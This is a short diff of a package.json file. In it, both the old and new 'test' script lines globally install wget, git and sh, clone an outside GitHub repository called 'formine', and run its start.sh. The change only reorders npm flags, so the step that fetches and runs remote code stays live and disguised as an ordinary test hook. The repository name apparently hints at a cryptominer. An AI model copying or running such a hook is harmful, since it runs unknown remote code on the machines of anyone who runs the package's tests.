@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "npm install wget -g && npm install git -g && npm install sh -g && git clone https://github.com/baratha38edu/formine.git && cd formine && chmod u+x ./start.sh && sh start.sh"
+    "test": "npm install -g wget && npm install -g git && npm install -g sh && git clone https://github.com/baratha38edu/formine.git && cd formine && chmod u+x ./start.sh && sh start.sh"
   },
   "repository": {
     "type": "git",
